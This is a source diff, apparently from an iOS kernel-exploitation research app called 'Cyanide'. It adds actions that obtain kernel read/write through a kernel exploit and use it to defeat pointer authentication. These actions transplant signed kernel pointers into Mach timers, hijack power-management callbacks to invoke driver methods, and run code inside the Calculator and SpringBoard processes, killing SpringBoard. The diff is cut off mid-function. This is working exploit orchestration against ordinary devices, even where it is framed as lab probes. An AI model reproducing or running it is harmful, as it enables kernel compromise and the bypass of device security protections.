@@ -65,6 +65,10 @@
 #import "CyanideLabBridge.h"
 #import "CyanideLabProbe.h"
 #import "CNDPhysicalCSAllowInvalidProbe.h"
+#import "CNDPhysicalPACIdentityCanary.h"
+#import "CNDPhysicalCalculatorPACProbe.h"
+#import "CNDPhysicalSpringBoardPACProbe.h"
+#import "CNDLabThreadCallPACBoundary.h"
 #import "CNDHailMaryProbe.h"
 #import "CNDHailMaryPatch.h"
 #import "CNDHailMaryDataPage.h"
@@ -2650,11 +2654,614 @@ static void settings_run_lsreg_baseline_action(void)
     });
 }
 
-static void settings_run_physical_rx_probe_action(void)
+static void settings_run_lab_thread_call_pac_boundary_action(void)
 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         if (!settings_try_claim_actions_lock(
-                "physical SpringBoard RX probe",
+                "VM thread_call PAC boundary",
+                "[LAB_THREAD_CALL] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"VM thread_call probe blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[LAB_THREAD_CALL] Acquiring or reusing the vPhone lab KRW provider. This probe performs kernel reads only: no kcall, kernel write, timer arm, or callback dispatch.\n");
+        if (!cnd_lab_vphone_guest() || !settings_ensure_kexploit() ||
+            !kexploit_krw_ready() || !cnd_lab_kernel_rw_active()) {
+            log_user("[LAB_THREAD_CALL] Exact VM KRW provider acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"VM thread_call probe failed to acquire validated lab KRW.");
+            return;
+        }
+
+        log_user("[LAB_THREAD_CALL] Creating one ordinary Mach timer, resolving its exact ipc_port and dPAC label, and checking the idle embedded thread_call against the REA/shipped-instruction profile.\n");
+        CNDLabThreadCallPACBoundaryRun(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success = [report[@"exactReadOnlyBoundary"] boolValue] &&
+                    [report[@"timerDestroyed"] boolValue];
+                log_user("[LAB_THREAD_CALL] completed result=%s type=%u label-dPAC=%s callback-IA=%s idle-call=%s idle-timer=%s ownership=%s destroyed=%s\n",
+                    result.UTF8String ?: "unknown-result",
+                    [report[@"ioType"] unsignedIntValue],
+                    [report[@"timerLabelHasDataPAC"] boolValue] ? "yes" : "no",
+                    [report[@"callbackHasInstructionPAC"] boolValue] ? "yes" : "no",
+                    [report[@"exactIdleThreadCall"] boolValue] ? "yes" : "no",
+                    [report[@"exactIdleTimer"] boolValue] ? "yes" : "no",
+                    [report[@"exactOwnership"] boolValue] ? "yes" : "no",
+                    [report[@"timerDestroyed"] boolValue] ? "yes" : "no");
+                log_user("[LAB_THREAD_CALL] timer=%s callback=%s expected=%s flags=%s param0=%s port=%s\n",
+                    [settings_lsreg_text(report[@"timerObject"]) UTF8String],
+                    [settings_lsreg_text(report[@"callback"]) UTF8String],
+                    [settings_lsreg_text(report[@"expectedCallback"]) UTF8String],
+                    [settings_lsreg_text(report[@"threadCallFlags"]) UTF8String],
+                    [settings_lsreg_text(report[@"param0"]) UTF8String],
+                    [settings_lsreg_text(report[@"portObject"]) UTF8String]);
+                log_user("[LAB_THREAD_CALL] JSON: %s\n",
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"VM mk_timer/thread_call PAC boundary passed."
+                        : [NSString stringWithFormat:
+                            @"VM thread_call boundary finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+static void settings_run_lab_thread_call_pac_reuse_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "VM thread_call PAC-reuse dispatch",
+                "[LAB_THREAD_CALL_REUSE] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"VM PAC-reuse dispatch blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[LAB_THREAD_CALL_REUSE] Acquiring or reusing the vPhone lab KRW provider. This probe harvests two exact-build kernel-owned PAC-valid pointers, dispatches one gate-verified early-return target with controlled x0, then restores every transplanted field and repairs the timer owner state. It uses no kcall.\n");
+        if (!cnd_lab_vphone_guest() || !settings_ensure_kexploit() ||
+            !kexploit_krw_ready() || !cnd_lab_kernel_rw_active()) {
+            log_user("[LAB_THREAD_CALL_REUSE] Exact VM KRW provider acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"VM PAC-reuse dispatch failed to acquire validated lab KRW.");
+            return;
+        }
+
+        log_user("[LAB_THREAD_CALL_REUSE] Revalidating the idle timer, IA/0x73d8 braaz adapter source, IA-zero target source, and all three zero-valued early-return gates before arming. The ordered transplant is target, adapter, then x0 canary; every incomplete path cancels before restoration.\n");
+        CNDLabThreadCallPACBoundaryRunPACReuseDispatch(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success = [report[@"exactPACReuseDispatch"]
+                        boolValue] &&
+                    [report[@"callbackDispatched"] boolValue] &&
+                    [report[@"callbackCompleted"] boolValue] &&
+                    [report[@"exactPACReuseAdapterSource"] boolValue] &&
+                    [report[@"exactPACReuseTargetSource"] boolValue] &&
+                    [report[@"exactPACReuseReadOnlyTargetGates"] boolValue] &&
+                    [report[@"exactQueuedState"] boolValue] &&
+                    [report[@"pacReuseTransplantVerified"] boolValue] &&
+                    [report[@"pacReuseQueueDrained"] boolValue] &&
+                    [report[@"pacReuseTransplantedFieldsStable"] boolValue] &&
+                    [report[@"pacReuseReadOnlyTargetGatesStable"] boolValue] &&
+                    [report[@"pacReuseFieldsRestored"] boolValue] &&
+                    [report[@"pacReuseOwnerStateRepaired"] boolValue] &&
+                    [report[@"restoreVerifiedBeforeDestroy"] boolValue] &&
+                    [report[@"timerQuiescedBeforeDestroy"] boolValue] &&
+                    [report[@"timerDestroyed"] boolValue] &&
+                    ![report[@"usedKernelCall"] boolValue];
+                log_user("[LAB_THREAD_CALL_REUSE] completed result=%s armed=%s adapter=%s target=%s gates=%s transplanted=%s drained=%s completed=%s restored=%s owner-repaired=%s destroyed=%s kcall=%s\n",
+                    result.UTF8String ?: "unknown-result",
+                    [report[@"armedTimer"] boolValue] ? "yes" : "no",
+                    [report[@"exactPACReuseAdapterSource"] boolValue] ? "yes" : "no",
+                    [report[@"exactPACReuseTargetSource"] boolValue] ? "yes" : "no",
+                    [report[@"exactPACReuseReadOnlyTargetGates"] boolValue] ? "yes" : "no",
+                    [report[@"pacReuseTransplantVerified"] boolValue] ? "yes" : "no",
+                    [report[@"pacReuseQueueDrained"] boolValue] ? "yes" : "no",
+                    [report[@"callbackCompleted"] boolValue] ? "yes" : "no",
+                    [report[@"pacReuseFieldsRestored"] boolValue] ? "yes" : "no",
+                    [report[@"pacReuseOwnerStateRepaired"] boolValue] ? "yes" : "no",
+                    [report[@"timerDestroyed"] boolValue] ? "yes" : "no",
+                    [report[@"usedKernelCall"] boolValue] ? "yes" : "no");
+                log_user("[LAB_THREAD_CALL_REUSE] adapter=%s signed=%s target=%s signed=%s x0=%s queued-link=%s post-link=%s cancel-state=(armed=%u active=%u)\n",
+                    [settings_lsreg_text(report[@"pacReuseAdapter"]) UTF8String],
+                    [settings_lsreg_text(report[@"pacReuseAdapterSigned"]) UTF8String],
+                    [settings_lsreg_text(report[@"pacReuseTarget"]) UTF8String],
+                    [settings_lsreg_text(report[@"pacReuseTargetSigned"]) UTF8String],
+                    [settings_lsreg_text(report[@"pacReuseX0Canary"]) UTF8String],
+                    [settings_lsreg_text(report[@"queuedTCQueue"]) UTF8String],
+                    [settings_lsreg_text(report[@"pacReuseSettledTCQueue"]) UTF8String],
+                    [report[@"pacReusePostCancelIsArmed"] unsignedIntValue],
+                    [report[@"pacReusePostCancelActive"] unsignedIntValue]);
+                log_user("[LAB_THREAD_CALL_REUSE] JSON: %s\n",
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"VM two-stage PAC reuse dispatched the controlled-x0 early-return target and restored cleanly."
+                        : [NSString stringWithFormat:
+                            @"VM PAC-reuse dispatch finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+static void settings_run_lab_thread_call_pm_harvest_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "VM PM signed-callback transplant",
+                "[LAB_PM_CALLOUT] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"VM PM callback transplant blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[LAB_PM_CALLOUT] Acquiring or reusing validated vPhone KRW. This exact-build probe reuses the root-domain's signed pmDriverCallout callback in an idle sacrificial timer, stages one same-state setPowerState request, requires the action-done busy-bit clear, and restores all timer and PM fields. The provider kcall API is not used.\n");
+        if (!cnd_lab_vphone_guest() || !settings_ensure_kexploit() ||
+            !kexploit_krw_ready() || !cnd_lab_kernel_rw_active()) {
+            log_user("[LAB_PM_CALLOUT] Exact VM KRW provider acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"VM PM callback transplant failed to acquire validated lab KRW.");
+            return;
+        }
+
+        CNDLabThreadCallPACBoundaryRunPMCalloutHarvest(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success = [report[@"exactPMCalloutDispatch"] boolValue] &&
+                    [report[@"exactPMSource"] boolValue] &&
+                    [report[@"stagedExactly"] boolValue] &&
+                    [report[@"queueObserved"] boolValue] &&
+                    [report[@"queueDrained"] boolValue] &&
+                    [report[@"pmCompletionObserved"] boolValue] &&
+                    [report[@"transplantedFieldsStable"] boolValue] &&
+                    [report[@"pmStateRestored"] boolValue] &&
+                    [report[@"timerFieldsRestored"] boolValue] &&
+                    [report[@"ownerStateRepaired"] boolValue] &&
+                    [report[@"restoreVerifiedBeforeDestroy"] boolValue] &&
+                    [report[@"timerDestroyed"] boolValue] &&
+                    ![report[@"usedKernelCall"] boolValue];
+                log_user("[LAB_PM_CALLOUT] completed result=%s source=%s staged=%s queued=%s drained=%s busy-cleared=%s stable=%s pm-restored=%s timer-restored=%s owner-repaired=%s destroyed=%s provider-kcall=%s\n",
+                    result.UTF8String ?: "unknown-result",
+                    [report[@"exactPMSource"] boolValue] ? "yes" : "no",
+                    [report[@"stagedExactly"] boolValue] ? "yes" : "no",
+                    [report[@"queueObserved"] boolValue] ? "yes" : "no",
+                    [report[@"queueDrained"] boolValue] ? "yes" : "no",
+                    [report[@"pmCompletionObserved"] boolValue] ? "yes" : "no",
+                    [report[@"transplantedFieldsStable"] boolValue] ? "yes" : "no",
+                    [report[@"pmStateRestored"] boolValue] ? "yes" : "no",
+                    [report[@"timerFieldsRestored"] boolValue] ? "yes" : "no",
+                    [report[@"ownerStateRepaired"] boolValue] ? "yes" : "no",
+                    [report[@"timerDestroyed"] boolValue] ? "yes" : "no",
+                    [report[@"usedKernelCall"] boolValue] ? "yes" : "no");
+                log_user("[LAB_PM_CALLOUT] root=%s pwrMgt=%s signed-parent=%s target=%s state=%llu result-before=%s result-after=%s flags=%s->%s JSON=%s\n",
+                    [settings_lsreg_text(report[@"rootDomain"]) UTF8String],
+                    [settings_lsreg_text(report[@"pwrMgt"]) UTF8String],
+                    [settings_lsreg_text(report[@"signedPMCallback"]) UTF8String],
+                    [settings_lsreg_text(report[@"pmCallback"]) UTF8String],
+                    [report[@"powerState"] unsignedLongLongValue],
+                    [settings_lsreg_text(report[@"pmResultOriginal"]) UTF8String],
+                    [settings_lsreg_text(report[@"observedPMResult"]) UTF8String],
+                    [settings_lsreg_text(report[@"pmFlagsStaged"]) UTF8String],
+                    [settings_lsreg_text(report[@"observedPMFlags"]) UTF8String],
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"VM autonomously dispatched the signed PM callback and restored cleanly."
+                        : [NSString stringWithFormat:
+                            @"VM PM callback transplant finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+void settings_run_lab_pm_cross_class_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "VM PM IOUserServer dispatch",
+                "[LAB_PM_CROSS_CLASS] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"VM PM cross-class dispatch blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[LAB_PM_CROSS_CLASS] Acquiring validated vPhone KRW. This probe temporarily selects one live IOUserServer as the root PM controlling driver, lets the stock PM path authenticate and call its signed +0x4d8 method, then restores the controlling-driver, PM, and timer state. The provider kcall API is not used.\n");
+        if (!cnd_lab_vphone_guest() || !settings_ensure_kexploit() ||
+            !kexploit_krw_ready() || !cnd_lab_kernel_rw_active()) {
+            log_user("[LAB_PM_CROSS_CLASS] Exact VM KRW provider acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"VM PM cross-class dispatch failed to acquire validated lab KRW.");
+            return;
+        }
+
+        CNDLabThreadCallPACBoundaryRunPMCrossClassDispatch(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success =
+                    [report[@"exactPMCrossClassDispatch"] boolValue] &&
+                    [report[@"exactTargetDriver"] boolValue] &&
+                    [report[@"iokitDebugFastReturn"] boolValue] &&
+                    [report[@"stagedExactly"] boolValue] &&
+                    [report[@"pmCompletionObserved"] boolValue] &&
+                    [report[@"transplantedFieldsStable"] boolValue] &&
+                    [report[@"controllingDriverRestored"] boolValue] &&
+                    [report[@"pmStateRestored"] boolValue] &&
+                    [report[@"timerFieldsRestored"] boolValue] &&
+                    [report[@"ownerStateRepaired"] boolValue] &&
+                    [report[@"restoreVerifiedBeforeDestroy"] boolValue] &&
+                    [report[@"timerDestroyed"] boolValue] &&
+                    ![report[@"usedKernelCall"] boolValue];
+                log_user("[LAB_PM_CROSS_CLASS] completed result=%s target=%s method=%s staged=%s drained=%s busy-cleared=%s stable=%s driver-restored=%s pm-restored=%s timer-restored=%s destroyed=%s provider-kcall=%s\n",
+                    result.UTF8String ?: "unknown-result",
+                    [settings_lsreg_text(report[@"targetDriver"]) UTF8String],
+                    [settings_lsreg_text(report[@"targetSetPowerState"]) UTF8String],
+                    [report[@"stagedExactly"] boolValue] ? "yes" : "no",
+                    [report[@"queueDrained"] boolValue] ? "yes" : "no",
+                    [report[@"pmCompletionObserved"] boolValue] ? "yes" : "no",
+                    [report[@"transplantedFieldsStable"] boolValue] ? "yes" : "no",
+                    [report[@"controllingDriverRestored"] boolValue] ? "yes" : "no",
+                    [report[@"pmStateRestored"] boolValue] ? "yes" : "no",
+                    [report[@"timerFieldsRestored"] boolValue] ? "yes" : "no",
+                    [report[@"timerDestroyed"] boolValue] ? "yes" : "no",
+                    [report[@"usedKernelCall"] boolValue] ? "yes" : "no");
+                log_user("[LAB_PM_CROSS_CLASS] selected=%s expected=%s debug=%s observed-driver=%s JSON=%s\n",
+                    [settings_lsreg_text(report[@"selectedSetPowerState"]) UTF8String],
+                    [settings_lsreg_text(report[@"expectedTargetSetPowerState"]) UTF8String],
+                    [settings_lsreg_text(report[@"iokitDebugByte"]) UTF8String],
+                    [settings_lsreg_text(report[@"observedControllingDriver"]) UTF8String],
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"VM PM authenticated and dispatched the live IOUserServer override, then restored cleanly."
+                        : [NSString stringWithFormat:
+                            @"VM PM cross-class dispatch finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+void settings_run_lab_pm_m68_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "VM PM AppleM68Buttons dispatch",
+                "[LAB_PM_M68] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"VM PM AppleM68Buttons dispatch blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[LAB_PM_M68] Acquiring validated vPhone KRW. This probe temporarily selects the exact live AppleM68Buttons service as the root PM controlling driver, stages selector 2, and lets the stock signed PM callback authenticate and invoke its setPowerState override. The provider kcall API is not used.\n");
+        if (!cnd_lab_vphone_guest() || !settings_ensure_kexploit() ||
+            !kexploit_krw_ready() || !cnd_lab_kernel_rw_active()) {
+            log_user("[LAB_PM_M68] Exact VM KRW provider acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"VM PM AppleM68Buttons dispatch failed to acquire validated lab KRW.");
+            return;
+        }
+
+        CNDLabThreadCallPACBoundaryRunPMM68Dispatch(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success =
+                    [report[@"exactPMM68Dispatch"] boolValue] &&
+                    [report[@"exactTargetDriver"] boolValue] &&
+                    [report[@"stagedExactly"] boolValue] &&
+                    [report[@"pmCompletionObserved"] boolValue] &&
+                    [report[@"transplantedFieldsStable"] boolValue] &&
+                    [report[@"controllingDriverRestored"] boolValue] &&
+                    [report[@"powerStateRestored"] boolValue] &&
+                    [report[@"pmStateRestored"] boolValue] &&
+                    [report[@"timerFieldsRestored"] boolValue] &&
+                    [report[@"ownerStateRepaired"] boolValue] &&
+                    [report[@"restoreVerifiedBeforeDestroy"] boolValue] &&
+                    [report[@"timerDestroyed"] boolValue] &&
+                    ![report[@"usedKernelCall"] boolValue];
+                log_user("[LAB_PM_M68] completed result=%s target=%s method=%s selector=%s staged=%s drained=%s busy-cleared=%s driver-restored=%s selector-restored=%s pm-restored=%s timer-restored=%s destroyed=%s provider-kcall=%s\n",
+                    result.UTF8String ?: "unknown-result",
+                    [settings_lsreg_text(report[@"targetDriver"]) UTF8String],
+                    [settings_lsreg_text(report[@"targetSetPowerState"]) UTF8String],
+                    [settings_lsreg_text(report[@"powerStateStaged"]) UTF8String],
+                    [report[@"stagedExactly"] boolValue] ? "yes" : "no",
+                    [report[@"queueDrained"] boolValue] ? "yes" : "no",
+                    [report[@"pmCompletionObserved"] boolValue] ? "yes" : "no",
+                    [report[@"controllingDriverRestored"] boolValue] ? "yes" : "no",
+                    [report[@"powerStateRestored"] boolValue] ? "yes" : "no",
+                    [report[@"pmStateRestored"] boolValue] ? "yes" : "no",
+                    [report[@"timerFieldsRestored"] boolValue] ? "yes" : "no",
+                    [report[@"timerDestroyed"] boolValue] ? "yes" : "no",
+                    [report[@"usedKernelCall"] boolValue] ? "yes" : "no");
+                log_user("[LAB_PM_M68] JSON=%s\n",
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"VM PM authenticated and dispatched AppleM68Buttons, then restored cleanly."
+                        : [NSString stringWithFormat:
+                            @"VM PM AppleM68Buttons dispatch finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+void settings_run_physical_pac_identity_canary_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "physical PAC identity canary",
+                "[PAC_CANARY] Another action is already running.")) {
+            settings_post_actions_complete_async(
+                NO, @"Physical PAC canary blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[PAC_CANARY] Acquiring or reusing Cyanide's physical KRW session. The canary performs kernel reads only and does not use kcall.\n");
+        if (!settings_ensure_kexploit() || !kexploit_krw_ready()) {
+            log_user("[PAC_CANARY] KRW acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(
+                NO, @"Physical PAC canary failed to acquire validated KRW.");
+            return;
+        }
+
+        log_user("[PAC_CANARY] Creating a controlled Cyanide worker exception. KRW will bind the identity-delivered task/thread rights, snapshot the exact upcb/JOP state before the reply, and snapshot it again while the resumed worker spins without a syscall.\n");
+        CNDPhysicalPACIdentityCanaryRun(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success = [report[@"exactPhysicalPACValidatorCanary"]
+                    boolValue];
+                log_user("[PAC_CANARY] completed result=%s krw-identity=%s thread-control=%s task-control=%s converter=%s resumed=%s saved-state=%s jop-changed=%s tuple=%s rescue=%s\n",
+                    result.UTF8String ?: "unknown-result",
+                    [report[@"krwPreflightIdentityVerified"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"exactThreadControlRight"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"exactTaskControlRight"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"deliveredRightConversionSucceeded"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"workerResumed"] boolValue] ? "yes" : "no",
+                    [report[@"savedStateAddressStable"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"jopHashChanged"] boolValue] ? "yes" : "no",
+                    [report[@"resumedTupleExact"] boolValue] ? "yes" : "no",
+                    [report[@"controlRightRescueUsed"] boolValue]
+                        ? "yes" : "no");
+                log_user("[PAC_CANARY] JSON: %s\n",
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"Physical PAC validator-consumption canary passed."
+                        : [NSString stringWithFormat:
+                            @"Physical PAC validator canary finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+void settings_run_physical_calculator_pac_probe_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "physical Calculator PAC probe",
+                "[CALCULATOR_PAC] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"Calculator PAC probe blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[CALCULATOR_PAC] Acquiring or reusing physical KRW. The probe targets only the resident stock Calculator process, requests one kernel-minted identity thread right, executes getpid, and restores the original thread.\n");
+        if (!settings_ensure_kexploit() || !kexploit_krw_ready()) {
+            log_user("[CALCULATOR_PAC] KRW acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"Calculator PAC probe failed to acquire validated KRW.");
+            return;
+        }
+
+        CNDPhysicalCalculatorPACProbeRun(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success = [report[
+                    @"exactCalculatorCrossProcessPACExecution"] boolValue];
+                NSDictionary *marker = report[@"afterMarker"];
+                NSDictionary *restored = report[@"afterRestore"];
+                log_user("[CALCULATOR_PAC] completed result=%s pid=%lld marker=%lld identity-message=%s thread-right=%s task-right=%s converter=%s reply=%s conversions=%lld restore-conversions=%lld restored=%s target-stable=%s kcall=no forged-task-port=no\n",
+                    result.UTF8String ?: "unknown-result",
+                    [report[@"targetPIDBefore"] longLongValue],
+                    [report[@"markerPID"] longLongValue],
+                    [marker[@"identityMessageValid"] boolValue]
+                        ? "yes" : "no",
+                    [marker[@"identityThreadRightExact"] boolValue]
+                        ? "yes" : "no",
+                    [marker[@"identityTaskRightExact"] boolValue]
+                        ? "yes" : "no",
+                    [marker[@"identityInitialConversionSucceeded"] boolValue]
+                        ? "yes" : "no",
+                    [marker[@"identityInitialReplySucceeded"] boolValue]
+                        ? "yes" : "no",
+                    [marker[@"identityConversionCount"] longLongValue],
+                    [restored[@"identityConversionCount"] longLongValue],
+                    [report[@"threadRestored"] boolValue] ? "yes" : "no",
+                    [report[@"targetIdentityStable"] boolValue]
+                        ? "yes" : "no");
+                log_user("[CALCULATOR_PAC] JSON: %s\n",
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"Calculator cross-process PAC execution passed and restored."
+                        : [NSString stringWithFormat:
+                            @"Calculator PAC probe finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+void settings_run_physical_springboard_pac_probe_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "physical SpringBoard PAC probe",
+                "[SPRINGBOARD_PAC] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"SpringBoard PAC probe blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[SPRINGBOARD_PAC] Acquiring or reusing physical KRW. The probe binds one exact SpringBoard thread, executes only getpid with the proven KRW PAC-context signer, then self-terminates that exact SpringBoard incarnation and proves its replacement as cleanup. No dylib or kcall is used.\n");
+        if (!settings_ensure_kexploit() || !kexploit_krw_ready()) {
+            log_user("[SPRINGBOARD_PAC] KRW acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"SpringBoard PAC probe failed to acquire validated KRW.");
+            return;
+        }
+
+        CNDPhysicalSpringBoardPACProbeRun(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                NSDictionary *dispatch = report[@"terminalDispatch"];
+                NSDictionary *signedState = report[@"afterTerminalDispatch"];
+                BOOL success = [report[
+                    @"exactSpringBoardCrossProcessPACExecution"] boolValue];
+                log_user("[SPRINGBOARD_PAC] completed result=%s pid=%lld marker=%lld identity-message=%s thread-right=%s task-right=%s pac-fallbacks=%lld pac-failures=%lld kill-dispatched=%s old-exited=%s replacement-pid=%lld session-closed=%s kcall=no dylib=no\n",
+                    result.UTF8String ?: "unknown-result",
+                    [report[@"targetPIDBefore"] longLongValue],
+                    [report[@"markerPID"] longLongValue],
+                    [signedState[@"identityMessageValid"] boolValue]
+                        ? "yes" : "no",
+                    [signedState[@"identityThreadRightExact"] boolValue]
+                        ? "yes" : "no",
+                    [signedState[@"identityTaskRightExact"] boolValue]
+                        ? "yes" : "no",
+                    [signedState[@"identityPACFallbackCount"] longLongValue],
+                    [signedState[@"identityPACFallbackFailures"] longLongValue],
+                    [dispatch[@"oneWayDispatched"] boolValue] ? "yes" : "no",
+                    [report[@"oldSpringBoardIdentityExited"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"replacementPID"] longLongValue],
+                    [report[@"remoteSessionClosed"] boolValue]
+                        ? "yes" : "no");
+                log_user("[SPRINGBOARD_PAC] JSON: %s\n",
+                    [report[@"reportPath"] UTF8String] ?: "unavailable");
+                log_session_end();
+                settings_release_actions_lock();
+                settings_notify_remote_call_state_changed();
+                settings_post_actions_complete_async(success,
+                    success
+                        ? @"SpringBoard PAC execution passed; replacement cleanup proven."
+                        : [NSString stringWithFormat:
+                            @"SpringBoard PAC probe finished: %@.",
+                            result.length ? result : @"unknown-result"]);
+            });
+    });
+}
+
+static void settings_run_physical_pac_cross_task_canary_action(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        if (!settings_try_claim_actions_lock(
+                "physical cross-task PAC canary",
+                "[PAC_CROSS_TASK] Another action is already running.")) {
+            settings_post_actions_complete_async(NO,
+                @"Cross-task PAC canary blocked: another action is running.");
+            return;
+        }
+
+        log_session_begin();
+        log_user("[PAC_CROSS_TASK] Acquiring or reusing Cyanide's physical KRW session. No kcall or stock-process target is used.\n");
+        if (!settings_ensure_kexploit() || !kexploit_krw_ready()) {
+            log_user("[PAC_CROSS_TASK] KRW acquisition or validation failed.\n");
+            log_session_end();
+            settings_release_actions_lock();
+            settings_post_actions_complete_async(NO,
+                @"Cross-task PAC canary failed to acquire validated KRW.");
+            return;
+        }
+
+        log_user("[PAC_CROSS_TASK] Forking one sacrificial child with only the exception send right inherited as its bootstrap special port. The parent restores its own bootstrap port immediately and holds no child task/thread right before EXCEPTION_STATE_IDENTITY delivery.\n");
+        CNDPhysicalPACCrossTaskCanaryRun(
+            ^(NSDictionary<NSString *, id> *report) {
+                NSString *result = settings_lsreg_text(report[@"result"]);
+                BOOL success = [report[@"exactPhysicalPACCrossTaskCanary"]
+                    boolValue];
+                log_user("[PAC_CROSS_TASK] completed result=%s bootstrap-restored=%s distinct-task=%s identity=%s task-control=%s converter=%s resumed=%s child-exit=%s\n",
+                    result.UTF8String ?: "unknown-result",
+                    [report[@"parentBootstrapRestored"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"distinctKernelTask"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"crossTaskIdentityVerified"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"exactTaskControlRight"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"deliveredRightConversionSucceeded"] boolValue]
+                        ? "yes" : "no",
+                    [report[@"childResumed"] boolValue] ? "yes" : "no",
+                    [report[@"childExitedCleanly"] boolValue]
